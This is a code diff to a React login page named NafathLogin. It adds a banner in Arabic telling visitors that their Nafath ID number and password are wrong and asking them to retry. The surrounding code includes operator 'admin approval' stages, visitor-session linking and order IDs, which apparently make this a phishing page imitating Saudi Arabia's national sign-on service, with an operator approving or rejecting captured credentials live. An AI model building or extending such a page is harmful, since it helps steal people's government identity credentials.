@@ -4,6 +4,7 @@ import { Loader2, User, Lock, LogIn, Info } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
 import VerificationLayout from "@/components/VerificationLayout";
 import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
+import RejectionBanner from "@/components/RejectionBanner";
 import { createOrUpdateStage, useAdminApproval } from "@/hooks/useAdminApproval";
 import { linkVisitorToSession } from "@/lib/visitorLink";
 import { toast } from "sonner";
@@ -27,6 +28,7 @@ const NafathLogin = () => {
   const [orderId, setOrderId] = useState<string | null>(passedOrderId);
   const [showPassword, setShowPassword] = useState(false);
   const [waitingApproval, setWaitingApproval] = useState(false);
+  const [rejected, setRejected] = useState(false);
 
   const approvalStatus = useAdminApproval(waitingApproval ? orderId : null, "nafath_login");
 
@@ -38,6 +40,7 @@ const NafathLogin = () => {
       toast.error("تم رفض الطلب");
       setWaitingApproval(false);
       setLoading(false);
+      setRejected(true);
     }
   }, [approvalStatus]);
 
@@ -84,6 +87,11 @@ const NafathLogin = () => {
               exit={{ opacity: 0, y: -12 }}
               transition={{ duration: 0.4 }}
             >
+              <RejectionBanner
+                show={rejected}
+                message="بيانات الدخول لنفاذ غير صحيحة. يرجى التأكد من رقم الهوية وكلمة المرور وإعادة المحاولة."
+                onDismiss={() => setRejected(false)}
+              />
               {/* Form fields */}
               <div className="space-y-3">
                 <motion.div
